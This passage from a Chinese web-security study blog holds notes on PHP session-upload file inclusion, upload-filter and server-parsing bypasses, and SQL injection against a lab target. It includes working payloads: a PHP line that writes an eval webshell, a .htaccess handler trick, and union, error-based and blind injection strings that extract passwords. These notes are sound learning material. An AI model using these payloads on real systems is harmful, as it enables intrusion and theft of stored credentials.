<li>将会储存PHP_SESSION_UPLOAD_PROGRESS进度信息（例如：PHP_SESSION_UPLOAD_PROGRESS=<?php rename("readme.txt","xiaoma.php");?>）</li>
<li>使用文件包含漏洞包含该含义PHP恶意代码的文件将会执行修改文件的代码</li>
<li>使用多线程同时竞争</li>
</ul>
</li>
</ul>
<p>sess_123文件内容</p>
<pre><code>upload_progress_&lt;?php rename(&quot;readme.txt&quot;,&quot;readme.php&quot;);?&gt;|a:5:{s:10:&quot;start_time&quot;;i:1564991083;s:14:&quot;content_length&quot;;i:288;s:15:&quot;bytes_processed&quot;;i:288;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1564991083;s:15:&quot;bytes_processed&quot;;i:0;}}}</code></pre><p>实验效果：<br><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649914396031.png" alt></p>
<p>修改后变成xiaoma.php（当然可以还可以利用代码生成写入一句话木马）</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649916186321.png" alt></p>
<p><em>（该方法利用出现在强网杯JustSoSo题目中的非预期解）</em></p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>前端验证，直接使用burp抓包修改名字。或者浏览器禁用js</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>上传可执行脚本，修改Content-Type</p>
<h4 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h4><ul>
<li><p><strong>大小写绕过：</strong>Php、PhP、pHp等可Fuzz测试得到黑名单</p>
</li>
<li><p><strong>空格截断：</strong>在后缀后面使用一个空格截断检测</p>
</li>
<li><p><strong>重写绕过：</strong>主要用于将php这个关键字进行替换为空的例如如下代码</p>
</li>
</ul>
<pre><code class="php">&lt;?php
$type=str_replace(&#39;php&#39;,&#39;&#39;,$a);
?&gt;</code></pre>
<p>可以使用重写直接绕过该替换例如修改为：1.pphphp ,将可以直接绕过过滤</p>
<ul>
<li><p><strong>特殊后缀名绕过：</strong>ASP语言类：.asa    .cer    .cdx</p>
<pre><code>                          PHP语言类:    .php3    .php4    .php5
                               .net语言类：.ashx</code></pre></li>
<li><p><strong>文件头检测绕过：</strong>使用图片马或者给小马加个图片头</p>
</li>
<li><p><strong>分布式配置文件绕过：</strong>能够上传或者修改.htacess文件，是服务器在该文件夹解析jpg文件。</p>
</li>
<li><p><strong>分布式配置文件上传漏洞的实例</strong></p>
</li>
</ul>
<ol>
<li><p>建立.htaccess文件,内容如下:</p>
<pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre><p>并将其上传至服务器中</p>
</li>
</ol>
<p>并将其上传至服务器中</p>
<ol start="2">
<li>上传php木马文件名包含jpg即可造成解析</li>
</ol>
<ul>
<li><strong>上传文件类型00截断</strong></li>
</ul>
<p>burpsuite上传抓包，16进制下修改文件名与后缀之间的一个字符的16进制改成00；</p>
<p>例如：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15650128192120.png" alt></p>
<h4 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h4><ul>
<li><strong>Apache2.2.11解析漏洞</strong></li>
</ul>
<p>例如：cimer.php.owf.rar  “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把cimer.php.owf.rar解析成php</p>
<ul>
<li><strong>IIS6.0解析漏洞</strong></li>
</ul>
<p><strong>1.目录解析漏洞</strong></p>
<p>在网站下建立文件夹的名字为 .asp /.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</p>
<p>例如： /cimer.asp/1.jpg 将会被按照正常的asp文件进行解析<br><strong>2.文件解析漏洞</strong></p>
<p>在IIS6.0下，分号后面的不被解析，如 cimer.asp;.jpg会被当做cimer.asp<br>还有iis6.0默认的可执行文件除了asp还包含.asa、.cer、.cdx</p>
<p>Nginx解析漏洞<br>在默认Fast-CGI开启状况下,攻击者上传一个名字为cimer.jpg，内容为</p>
<pre><code class="PHP">&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</code></pre>
<p>然后访问cimer.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/21ffb483b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/21ffb483b.html" class="post-title-link" itemprop="url">SQL注入学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-04 10:05:54" itemprop="dateCreated datePublished" datetime="2019-08-04T10:05:54+08:00">2019-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:13:31" itemprop="dateModified" datetime="2020-10-14T17:13:31+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li>时间：2019年8月6日21:39:22</li>
<li>地点：福州大学</li>
</ul>
<h3 id="单引号字符型注入"><a href="#单引号字符型注入" class="headerlink" title="单引号字符型注入"></a>单引号字符型注入</h3><h4 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h4><p>​     and 1=2 时候任然返回正常，但是” ’ “时会报错</p>
<ul>
<li><strong>sql语句</strong>：</li>
</ul>
<pre><code class="mysql">&#39;order by 1,2,3--+</code></pre>
<ul>
<li><p><strong>语义</strong>：查询表中有几个字段，如果字段超过实际个数将会报错</p>
</li>
<li><p><strong>eg</strong>:</p>
</li>
</ul>
<pre><code class="html">http://www.sql.com/Less-1/?id=1%27%20order%20by%201,2,3%20--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649678592883.png" alt="1564883718907"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649679094636.png" alt="1564884099855"></p>
<h4 id="检测回显位"><a href="#检测回显位" class="headerlink" title="检测回显位"></a>检测回显位</h4><ul>
<li><strong>sql语句：</strong></li>
</ul>
<pre><code class="mysql">union select 1,2,3--+                    </code></pre>
<ul>
<li><p><strong>语义：</strong>查询存在的表段中的显位。使用时候将id改成不存在的id值然后查询。如果返回位有显示，则在该返回位可以进行查询</p>
</li>
<li><p><strong>eg:</strong></p>
</li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,2,3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682028375.png" alt="1564884653714"></p>
<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><ul>
<li><strong>sql语句：</strong>                    </li>
</ul>
<pre><code class="mysql">select group_concat(schema_name)from information_schema.schemata#注意：group_concat()是将返回的数据当做一行输出</code></pre>
<ul>
<li><strong>语义：</strong>查询information_schema数据库中的shcemata中的schema_name表段的内容，该数据库的该表段储存了Mysql所有数据库的名字（Mysql5.5+）</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682417938.png" alt="1564885490338"></p>
<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><ul>
<li><strong>sql语句:</strong></li>
</ul>
<pre><code class="mysql">select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></pre>
<ul>
<li><strong>语义：</strong>查询information_schema数据库中的tables表中的table_name内容条件为table_schema（保存数据库名字）为security,该语句将会爆出该数据库的所有表名</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683003970.png" alt="1564885936768"></p>
<h4 id="爆表段"><a href="#爆表段" class="headerlink" title="爆表段"></a>爆表段</h4><ul>
<li><strong>sql语句：</strong></li>
</ul>
<pre><code class="mysql">select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;</code></pre>
<ul>
<li><strong>语义:</strong>  该语句查询information_schema数据库中的columns表中column_name表段的值，条件table_name=’users‘,该语句可以查询出改表的所有表段</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683779377.png" alt="1564886738794"></p>
<h4 id="爆表段值"><a href="#爆表段值" class="headerlink" title="爆表段值"></a>爆表段值</h4><ul>
<li><strong>sql语句:</strong></li>
</ul>
<pre><code class="mysql">select group_concat(password) from security.user</code></pre>
<ul>
<li><strong>语义:</strong>查询security数据库中的user表中的password表段的所有值，查询用户名类似。</li>
<li><strong>eg:</strong></li>
</ul>
<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/1564968443135.png" alt="1564887127624"></p>
<p>(完)</p>
<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><p><strong>标志：</strong>使用and1=1 和and 1=2时候出现页面变化说明是数值型注入。具体流程与上面一样，但是无需使用（’）作为闭合。</p>
<h3 id="单引号括型字符型注入"><a href="#单引号括型字符型注入" class="headerlink" title="单引号括型字符型注入"></a>单引号括型字符型注入</h3><ul>
<li><strong>标志：</strong> 使用and 1= 1和and 1=2 返回无差异说明是字符型注入，使用单引号闭合再使用order by 爆出语法错误，使用  ‘) 闭合可以正常注入。</li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>若存在注入，但是并没有显位，但是页面存在报错代码，那么可以通过报错作为显位。</p>
<ul>
<li><strong>报错注入的三种方式：</strong></li>
</ul>
<ol>
<li><p>通过floor报错</p>
<pre><code class="mysql">and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
<p> 输出字符长度限制为64个字符</p>
<p> 输出字符长度限制为64个字符</p>
</li>
<li><p>通过updatexml报错</p>
<pre><code class="mysql">and updatexml(1,payload,1)</code></pre>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
</li>
<li><p>通过ExtractValue报错</p>
<pre><code class="mysql">and extractvalue(1, payload)</code></pre>
<p>输出字符有长度限制，最长32位。</p>
<p>输出字符有长度限制，最长32位。</p>
</li>
</ol>
<p>例子：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190806/1565058715692.png" alt></p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="mysql">#布尔盲注可能用到的函数
ascii()#括号中的参数转化成相应的ascii码
ORD()与ascii()#用法类似
substr()substr(a,b,c)#从b 位置开始，截取字符串a 的c 长度。
mid()用法与substr（）#类似
length()#返回str字符串的长度
left(database(),1) #取database字符串的左边第一个</code></pre>
<p>例子</p>
<pre><code class="mysql">&#39; and mid(version(),2,1)=&#39;.&#39; --+</code></pre>
<p>语义:mid用于截断版本号的第二位是不是等于“.”如果是则放回TURE否则FALSE</p>
<pre><code class="mysql">#爆出数据库版本：
and mid(version(),1,1)=1
#爆出数据库用户：
and ascii(mid(user(),1,1))&gt;18
#爆出表名：
and ascii(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;18</code></pre>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><pre><code class="mysql">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep</code></pre>
<h4 id="SQL注入高级用法（读写文件）"><a href="#SQL注入高级用法（读写文件）" class="headerlink" title="SQL注入高级用法（读写文件）"></a><strong>SQL注入高级用法（读写文件）</strong></h4><p>(后续补入)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3a8da2734.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d3a8da2734.html" class="post-title-link" itemprop="url">关于我</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-01 17:51:44" itemprop="dateCreated datePublished" datetime="2019-08-01T17:51:44+08:00">2019-08-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:06:05" itemprop="dateModified" datetime="2020-10-14T17:06:05+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AboutMe/" itemprop="url" rel="index"><span itemprop="name">AboutMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>107</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ID:Gq/xiaoleung</p>
<p>乌云ID:土豪</p>
<p>一名CS大学生退役士兵，主要学习web安全的小菜鸡。</p>
<p>热爱摄影，热爱户外，热爱编程和网络安全。</p>
<p>Email:admin#plasf.cn</p>
<p>WeChat:Q1BMQVhERg==</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
      src="/header.jpg">
  <p class="site-author-name" itemprop="name">XiaoLeung</p>
  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">70</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">259k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">3:56</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        


  <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
  </div>






      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
